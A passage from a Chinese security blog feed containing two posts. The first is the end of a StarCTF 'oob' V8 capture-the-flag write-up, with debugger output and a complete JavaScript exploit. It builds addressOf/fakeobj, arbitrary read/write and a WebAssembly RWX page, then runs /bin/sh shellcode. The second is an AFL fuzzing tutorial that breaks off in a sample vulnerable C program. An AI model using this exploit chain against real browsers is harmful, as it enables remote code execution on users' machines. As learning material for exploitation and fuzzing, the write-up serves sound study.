[FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x2aeb9878ac19 &lt;Object map = 0x3e43f7c4abd9&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x1de519340c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - module_object: 0x2aeb9878e411 &lt;Module map = 0x3e43f7c491e9&gt;</span></span><br><span class="line"><span class="comment"> - exports_object: 0x2aeb9878e681 &lt;Object map = 0x3e43f7c4ad19&gt;</span></span><br><span class="line"><span class="comment"> - native_context: 0x059fa5601869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - memory_object: 0x059fa561f9e9 &lt;Memory map = 0x3e43f7c4a189&gt;</span></span><br><span class="line"><span class="comment"> - table 0: 0x2aeb9878e619 &lt;Table map = 0x3e43f7c49aa9&gt;</span></span><br><span class="line"><span class="comment"> - imported_function_refs: 0x1de519340c71 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - managed_native_allocations: 0x2aeb9878e5c1 &lt;Foreign&gt;</span></span><br><span class="line"><span class="comment"> - memory_start: 0x7f85c0d80000</span></span><br><span class="line"><span class="comment"> - memory_size: 65536</span></span><br><span class="line"><span class="comment"> - memory_mask: ffff</span></span><br><span class="line"><span class="comment"> - imported_function_targets: 0x561c5e8f7100</span></span><br><span class="line"><span class="comment"> - globals_start: (nil)</span></span><br><span class="line"><span class="comment"> - imported_mutable_globals: 0x561c5e8f8480</span></span><br><span class="line"><span class="comment"> - indirect_function_table_size: 0</span></span><br><span class="line"><span class="comment"> - indirect_function_table_sig_ids: (nil)</span></span><br><span class="line"><span class="comment"> - indirect_function_table_targets: (nil)</span></span><br><span class="line"><span class="comment"> - properties: 0x1de519340c71 &lt;FixedArray[0]&gt; &#123;&#125;</span></span><br><span class="line"><span class="comment">pwndbg&gt; telescope 0x059fa561f8c1-1+0x88</span></span><br><span class="line"><span class="comment">00:0000│   0x59fa561f948 —▸ 0x1541e9fb6000 ◂— movabs r10, 0x1541e9fb6260 </span></span><br><span class="line"><span class="comment">01:0008│   0x59fa561f950 —▸ 0x2aeb9878e411 ◂— 0x7100003e43f7c491</span></span><br><span class="line"><span class="comment">02:0010│   0x59fa561f958 —▸ 0x2aeb9878e681 ◂— 0x7100003e43f7c4ad</span></span><br><span class="line"><span class="comment">03:0018│   0x59fa561f960 —▸ 0x59fa5601869 ◂— 0x1de519340f</span></span><br><span class="line"><span class="comment">04:0020│   0x59fa561f968 —▸ 0x59fa561f9e9 ◂— 0x7100003e43f7c4a1</span></span><br><span class="line"><span class="comment">05:0028│   0x59fa561f970 —▸ 0x1de5193404d1 ◂— 0x1de5193405</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">pwndbg&gt; vmmap 0x1541e9fb6000 #wasm code addr</span></span><br><span class="line"><span class="comment">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span></span><br><span class="line"><span class="comment">    0x1541e9fb6000     0x1541e9fb7000 rwxp     1000 0       +0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatArrayMap,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeobj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get shell</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + hex(f_addr));</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line">data_view.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">data_view.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), <span class="literal">true</span>);</span><br><span class="line">data_view.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), <span class="literal">true</span>);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>复现了蛮久的，细节还需要多理解。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://juejin.im/post/6844904096260947981#heading-2">https://juejin.im/post/6844904096260947981#heading-2</a></p><p><a href="https://changochen.github.io/2019-04-29-starctf-2019.html">https://changochen.github.io/2019-04-29-starctf-2019.html</a></p><p><a href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></p><p><a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></p><p><a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/">https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Chromium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> V8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzz&quot;入门&quot;</title>
      <link href="posts/2ba75ee3/"/>
      <url>posts/2ba75ee3/</url>
      
        <content type="html"><![CDATA[<h1 id="Fuzz-简介"><a href="#Fuzz-简介" class="headerlink" title="Fuzz 简介"></a>Fuzz 简介</h1><p><strong>模糊测试</strong> （fuzz testing, fuzzing）是一种<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95">软件测试</a>技术。其核心思想是将自动或半自动生成的随机数据输入到一个<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A8%8B%E5%BA%8F">程序</a>中，并监视程序异常，如崩溃，<a href="https://zh.wikipedia.org/wiki/%E6%96%B7%E8%A8%80_(%E7%A8%8B%E5%BC%8F)">断言</a>（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p><h2 id="Fuzz-的发展历程"><a href="#Fuzz-的发展历程" class="headerlink" title="Fuzz 的发展历程"></a>Fuzz 的发展历程</h2><ol><li><p>文件Fuzzing技术的兴起</p></li><li><p>语法模板Fuzzing</p></li><li><p>符号执行</p><p> 符号执行在学术界中应用得比较多，工业界相对少一些。在Fuzzing中，通过约束求解新路径的条件值，以增加代码覆盖率，可以一定程度上弥补暴力变异的不足。符号执行主要的挑战在于路径爆炸问题，约束求解能力的局限性，以及性能消耗问题，比如内存和时间消耗过大。</p></li><li><p>代码覆盖引导技术</p><p> 目前业界中基于代码覆盖率的最著名的三大Fuzzer，Google开发的<code>AFL</code>、<code>libfuzzer</code>和<code>honggfuzz</code>，且他们都是开源的，在github上都可以搜索到。</p></li></ol><h2 id="Pros-amp-Cons"><a href="#Pros-amp-Cons" class="headerlink" title="Pros &amp; Cons"></a>Pros &amp; Cons</h2><p>Fuzzing 是对于寻找漏洞是非常有效的，但其不是万能的，以下是它的一些优缺点。</p><p><strong>Pros</strong></p><ul><li>（不需要持续交互）Provides results with little effort - once a fuzzer’s up and running, it can be left for hours, days, or months to look for bugs with no interaction</li><li>Can reveal bugs missed in a manual audit</li><li>（检测程序整体的稳定性）Provides an overall picture of the robustness of the target software</li></ul><p><strong>Cons</strong></p><ul><li>（不能找到所有的漏洞）Won’t find all bugs - fuzzing may miss bugs that don’t trigger a full program crash, and may be less likely to trigger bugs that are only triggered in highly specific circumstances</li><li>（crash 样本比较难分析）The crashing test cases that are produced may be difficult to analyze, as the act of fuzzing doesn’t give you much knowledge of how the software operates internally</li><li>（对于复杂的程序效率会比较低）Programs with complex inputs can require much more work to produce a smart enough fuzzer to get sufficient code coverage</li></ul><h2 id="Anatomy-of-a-fuzzer"><a href="#Anatomy-of-a-fuzzer" class="headerlink" title="Anatomy of a fuzzer"></a>Anatomy of a fuzzer</h2><p>为了有效fuzz，fuzzer需要执行以下任务</p><ul><li>生成测试样本</li><li>记录测试用例的信息</li><li>把测试样例作为输入文件和目标程序（loader）进行对接</li><li>检测并监控 <code>crash</code></li></ul><p>其实上述所说的也就是一个 fuzzer 完整跑一遍的流程的简化。</p><h2 id="What-should-I-fuzz-Finding-the-right-software"><a href="#What-should-I-fuzz-Finding-the-right-software" class="headerlink" title="What should I fuzz? Finding the right software"></a>What should I fuzz? Finding the right software</h2><p>AFL在C或C ++应用程序上效果最好，因此，在 fuzz 之前一个”有效”的软件的攻击面是更为重要的。</p><ol><li>软件是否有示例代码？<ul><li>我们要 fuzz 的软件可能是很复杂很庞大的，如果其拥有大量的实例代码，那么我们快速定位到特定的模块，对每个模块单独 fuzz，这样测试的效果会更加优越。</li></ul></li><li>是否开源？<ul><li>对比开源项目来讲 afl 的效率会高很多，虽然 afl 也支持使用 qemu 进行黑盒 fuzz，但是效率会大打折扣。</li></ul></li><li>特殊样本是否容易收集？<ul><li>我们可能会要 fuzz 不同的文件格式，如果能够快速收集到大量有效的特殊的样本，那么 fuzz 的效率也会随之提高。</li></ul></li></ol><h1 id="AFL简介"><a href="#AFL简介" class="headerlink" title="AFL简介"></a>AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Micha? Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><ul><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）</li><li>将队列中的文件按一定的策略进行”突变”</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li><li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200803080223.jpeg" alt="afl"></p><blockquote><p>程序插桩:<br>最早是由J.C. Huang 教授提出的，它是在保证被测程序原有逻辑完整性的基础上在程序中插入一些<a href="https://baike.baidu.com/item/%E6%8E%A2%E9%92%88/1846154">探针</a>（又称为“探测仪”，本质上就是进行信息采集的<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81%E6%AE%B5/9966451">代码段</a>，可以是<a href="https://baike.baidu.com/item/%E8%B5%8B%E5%80%BC%E8%AF%AD%E5%8F%A5/4248688">赋值语句</a>或采集覆盖信息的<a href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/4127405">函数调用</a>），通过<a href="https://baike.baidu.com/item/%E6%8E%A2%E9%92%88/1846154">探针</a>的执行并抛出程序运行的<a href="https://baike.baidu.com/item/%E7%89%B9%E5%BE%81/6205236">特征</a>数据，通过对这些数据的<a href="https://baike.baidu.com/item/%E5%88%86%E6%9E%90/4327108">分析</a>，可以获得程序的<a href="https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E6%B5%81/854473">控制流</a>和数据流信息，进而得到<a href="https://baike.baidu.com/item/%E9%80%BB%E8%BE%91%E8%A6%86%E7%9B%96/3231015">逻辑覆盖</a>等动态信息，从而实现测试目的的方法。</p><p>代码覆盖率：<br>软件测试中的一种度量，描述程式中源代码被测试的比例和程度，所得比例称为代码覆盖率。</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul><li>直接安装：<code>sudo apt install afl</code></li><li><a href="http://lcamtuf.coredump.cx/afl/">官网</a>下载压缩包，解压后在目录中打开终端输入：<code>sudo make;sudo make install</code></li></ul><blockquote><p>推荐自己编译安装，apt 安装不支持黑盒测试。</p></blockquote><h2 id="Fuzz目标"><a href="#Fuzz目标" class="headerlink" title="Fuzz目标"></a>Fuzz目标</h2><p><code>AFL</code>主要用于<code>C/C++</code>程序的测试，所以这是我们寻找软件的最优先规则。</p><p>目标开源与否不是很重要。</p><ul><li><p>对于开源软件：AFL软件进行编译的同时进行插桩，以方便fuzz（效率更高</p></li><li><p>对于闭源软件：配合QEMU直接对闭源的二进制代码进行fuzz</p></li></ul><h2 id="构建语料库"><a href="#构建语料库" class="headerlink" title="构建语料库"></a>构建语料库</h2><p>AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库（”有用的”输入的集合）</p><h3 id="语料库选择"><a href="#语料库选择" class="headerlink" title="语料库选择"></a>语料库选择</h3><ul><li>有效的输入：尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。</li><li>尽量小的体积：种子文件最好小于 1KB，较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存。</li></ul><h3 id="主要来源"><a href="#主要来源" class="headerlink" title="主要来源"></a>主要来源</h3><ol><li><p>使用项目自身提供的测试用例</p></li><li><p>目标程序bug提交页面</p></li><li><p>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</p></li><li><p>afl源码的testcases目录下提供了一些测试用例</p></li><li><p>其他大型的语料库</p><ul><li><p><a href="http://lcamtuf.coredump.cx/afl/demo/">afl generated image test sets</a></p></li><li><p><a href="https://github.com/google/fuzzer-test-suite">fuzzer-test-suite</a></p></li><li><p><a href="https://samples.libav.org/">libav samples</a></p></li><li><p><a href="http://samples.ffmpeg.org/">ffmpeg samples</a></p></li><li><p><a href="https://github.com/MozillaSecurity/fuzzdata">fuzzdata</a></p></li><li><p><a href="https://gitlab.anu.edu.au/lunar/moonshine">moonshine</a></p></li></ul></li></ol><h3 id="修剪"><a href="#修剪" class="headerlink" title="修剪"></a>修剪</h3><p>网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——<code>afl-cmin</code>和<code>afl-tmin</code>。</p><h4 id="AFL-CMIN"><a href="#AFL-CMIN" class="headerlink" title="AFL-CMIN"></a>AFL-CMIN</h4><p><code>afl-cmin</code>的核心思想是：<strong>尝试找到与语料库全集具有相同覆盖范围的最小子集</strong>。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：</p><p><code>$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</code></p><p>更多的时候，我们需要从文件中获取输入，这时可以使用<code>@@</code>代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：</p><p><code>$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</code></p><h4 id="AFL-TMIN"><a href="#AFL-TMIN" class="headerlink" title="AFL-TMIN"></a>AFL-TMIN</h4><p><code>afl-tmin</code>用来缩减文件体积。</p><p><code>afl-tmin</code>有两种工作模式，<code>instrumented mode</code>和<code>crash mode</code>。默认的工作方式是<code>instrumented mode</code>。</p><p>命令： <code>$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</code> </p><p>如果指定了参数<code>-x</code>，即<code>crash mode</code>，会把导致程序非正常退出的文件直接剔除。</p><p>命令：<code>$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</code></p><h1 id="AFL实例"><a href="#AFL实例" class="headerlink" title="AFL实例"></a>AFL实例</h1><h2 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>) &#123;</span><br><span class="line">        raise(SIGSEGV); <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>) &#123;</span><br><span class="line">        